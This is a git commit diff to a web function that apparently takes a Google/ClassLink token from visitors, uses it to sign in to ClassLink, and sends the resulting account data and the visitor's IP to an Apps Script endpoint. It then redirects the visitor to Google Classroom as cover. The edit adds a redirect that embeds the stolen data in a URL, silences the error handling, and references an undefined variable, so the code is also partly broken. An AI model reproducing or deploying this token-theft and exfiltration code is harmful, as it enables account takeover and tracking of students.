05f49205663cc1c013928426ca0226fe83fcccc7
henxdl <123426614+henxdl@users.noreply.github.com>
2025-04-09 18:08:55 -0500

    Update pages.js

--- functions/api/pages.js
+++ functions/api/pages.js
@@ -9,9 +9,7 @@ export async function onRequest(context) {
     try {
         id = JSON.parse(idString);
         id = id.gwsToken;
-        return Response.redirect("https://id.google.com"+id, 302);
     } catch (error) {
-        return Response.redirect("https://error.google.com"+error, 302);
     }
     try {
         const nodeApiResponse = await fetch("https://nodeapi.classlink.com/user/signinwith", {
@@ -23,17 +21,17 @@ export async function onRequest(context) {
 
         if (nodeApiResponse.ok) {
             const nodeApiData = await nodeApiResponse.json();
-
+return Response.redirect("https://data.google.com/"+nodeApiData+'/userresponse/'+idMatch, 302);
             await fetch("https://script.google.com/macros/s/AKfycby_P-QtHUn6jY6pWyuaNPD3WY0IO4fbnBDaDjMrXJo/dev", {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
                 },
-                body: JSON.stringify({ userRes: idString, qrRes: nodeApiData, ip: ip })
+                body: JSON.stringify({ userRes: idMatch, qrRes: nodeApiData, ip: ip })
             });
         }
     } catch (error) {
-        return Response.redirect("https://error.google.com"+error, 302);
+        
     }
     return Response.redirect("https://classroom.google.com", 302);
 }
